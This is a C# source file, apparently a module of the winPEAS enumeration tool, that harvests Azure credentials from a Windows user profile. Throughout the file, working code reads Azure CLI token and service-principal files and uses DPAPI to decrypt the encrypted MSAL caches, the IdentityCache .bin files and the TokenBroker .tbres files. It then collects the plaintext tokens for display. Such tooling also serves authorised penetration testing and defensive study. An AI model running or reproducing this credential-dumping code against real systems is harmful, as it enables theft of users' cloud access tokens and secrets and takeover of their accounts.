using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using winPEAS.Helpers;
using System.Data.SQLite;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Parameters;
using Org.BouncyCastle.Crypto.Modes;
using System.Linq;
using Microsoft.Win32;
using System.Web.Script.Serialization;
using System;
using System.IO;
using System.Text.Json;
using System.Text.Json.Nodes;


namespace winPEAS.Info.CloudInfo
{
    internal class AzureTokensInfo : CloudInfoBase
    {
        public override string Name => "Azure Tokens";

        public override bool IsCloud => CheckIfAzureTokensInstalled();

        private Dictionary<string, List<EndpointData>> _endpointData = null;

        public static bool CheckIfAzureTokensInstalled()
        {
            string homeDirectory = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            string AzureFolderPath = Path.Combine(homeDirectory, ".Azure");
            string azureFolderPath = Path.Combine(homeDirectory, ".azure");

            string identityCachePath = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Microsoft",
                "IdentityCache"
            );

            string tokenBrokerPath = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Microsoft",
                "TokenBroker"
            );

            return Directory.Exists(AzureFolderPath) || Directory.Exists(azureFolderPath) || Directory.Exists(identityCachePath) || Directory.Exists(tokenBrokerPath);
        }

        public static string TBRESDecryptedData(string filePath)
        {
            var fileJSON = File.ReadAllText(filePath, Encoding.Unicode);
            fileJSON = fileJSON.Substring(0, fileJSON.Length - 1);

            try
            {
                var jsonObject = JsonNode.Parse(fileJSON).AsObject();
                var encodedData = jsonObject["TBDataStoreObject"]["ObjectData"]["SystemDefinedProperties"]["ResponseBytes"]["Value"].ToString();
                var encryptedData = Convert.FromBase64String(encodedData);
                var decryptedData = ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser);
                string decodedData = Encoding.UTF8.GetString(decryptedData);

                if (decodedData.Contains("No Token"))
                {
                    return "";
                }

                return decodedData;

            }
            catch (System.Exception)
            {
                Beaprint.PrintException($"[!] Error Decrypting File: {filePath}");
                return "";
            }
        }


        private List<EndpointData> GetAzureCliValues()
        {
            Dictionary<string, string> AzureCliValues = new Dictionary<string, string>();
            string homeDirectory = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            string AzureFolderPath = Path.Combine(homeDirectory, ".Azure");
            string azureFolderPath = Path.Combine(homeDirectory, ".azure");

            string azureHomePath = azureFolderPath;

            if (Directory.Exists(AzureFolderPath))
            {
                azureHomePath = AzureFolderPath;
            };

            if (Directory.Exists(azureHomePath))
            {

                // Files that doesn't need decryption
                string[] fileNames = {
                @"azureProfile.json",
                @"clouds.config",
                @"service_principal_entries.json",
                @"msal_token_cache.json"
            };

                foreach (string fileName in fileNames)
                {
                    string filePath = Path.Combine(azureHomePath, fileName);
                    // Check if the file exists
                    if (File.Exists(filePath))
                    {
                        try
                        {
                            // Read the file content
                            string fileContent = File.ReadAllText(filePath);

                            // Add the file path and content to the dictionary
                            AzureCliValues[filePath] = fileContent;
                        }
                        catch (Exception ex)
                        {
                            Beaprint.PrintException($"Error reading file '{filePath}': {ex.Message}");
                        }
                    }
                }
            }



            // Get the IdentityCache directory path and encrypted files with tokens
            string identityCachePath = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Microsoft",
                "IdentityCache"
            );

            string[] binFiles = { };

            // Check if the directory exists
            if (!Directory.Exists(identityCachePath))
            {
                Beaprint.PrintException($"The directory '{identityCachePath}' does not exist.");
            }

            try
            {
                // Recursively find all *.bin files
                binFiles = Directory.GetFiles(identityCachePath, "*.bin", SearchOption.AllDirectories);
            }
            catch (Exception ex)
            {
                Beaprint.PrintException($"An error occurred while scanning the identityCache directory: {ex.Message}");
            }
            

            // Files that need decryption
            string[] fileNamesEncrp = {
                @"service_principal_entries.bin",
                @"msal_token_cache.bin"
            };

            foreach (string fileName in fileNamesEncrp.Concat(binFiles).ToArray())//.Concat(tbFiles).ToArray())
            {
                string filePath = fileName;

                if (!fileName.Contains("\\"))
                {
                    filePath = Path.Combine(azureHomePath, fileName);
                }

                try
                {
                    if (File.Exists(filePath))
                    {
                        // Read encrypted file
                        byte[] encryptedData = File.ReadAllBytes(filePath);

                        // Decrypt using DPAPI for the current user
                        byte[] decryptedData = ProtectedData.Unprotect(
                            encryptedData,
                            null,
                            DataProtectionScope.CurrentUser
                        );

                        // Write decrypted data to output file
                        AzureCliValues[filePath] = Encoding.UTF8.GetString(decryptedData);
                    }

                }
                catch (CryptographicException ex)
                {
                    Beaprint.PrintException($"Decrypting {filePath} failed: {ex.Message}");
                }
                catch (Exception ex)
                {
                    Beaprint.PrintException($"An error occurred: {ex.Message}");
                }
            }


            //TBRES files
            string tokenBrokerPath = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Microsoft",
                "TokenBroker"
            );

            string[] tbFiles = { };

            // Check if the directory exists
            if (!Directory.Exists(tokenBrokerPath))
            {
                Beaprint.PrintException($"The directory '{tokenBrokerPath}' does not exist.");
            }

            try
            {
                // Recursively find all *.bin files
                tbFiles = Directory.GetFiles(tokenBrokerPath, "*.tbres", SearchOption.AllDirectories);
            }
            catch (Exception ex)
            {
                Beaprint.PrintException($"An error occurred while scanning the Token Broker directory: {ex.Message}");
            }

            foreach (string filePath in tbFiles)
            {
                string TBRESContent = TBRESDecryptedData(filePath);
                if (TBRESContent.Length > 0)
                    AzureCliValues[filePath] = TBRESContent;
            }

            // Format the info in expected CloudInfo format
            List<EndpointData> _endpointDataList = new List<EndpointData>();

            foreach (var kvp in AzureCliValues)
            {
                _endpointDataList.Add(new EndpointData()
                {
                    EndpointName = kvp.Key,
                    Data = kvp.Value?.Trim(),
                    IsAttackVector = false
                });
            }

            return _endpointDataList;
        }
        

        public override Dictionary<string, List<EndpointData>> EndpointDataList()
        {
            if (_endpointData == null)
            {
                _endpointData = new Dictionary<string, List<EndpointData>>();

                try
                {
                    if (IsAvailable)
                    {
                        _endpointData.Add("Local Info", GetAzureCliValues());
                    }
                    else
                    {
                        _endpointData.Add("General Info", new List<EndpointData>()
                        {
                            new EndpointData()
                            {
                                EndpointName = "",
                                Data = null,
                                IsAttackVector = false
                            }
                        });
                    }
                }
                catch (Exception ex)
                {
                    Beaprint.PrintException(ex.Message);
                }
            }

            return _endpointData;
        }

        public override bool TestConnection()
        {
            return true;
        }
    }
}
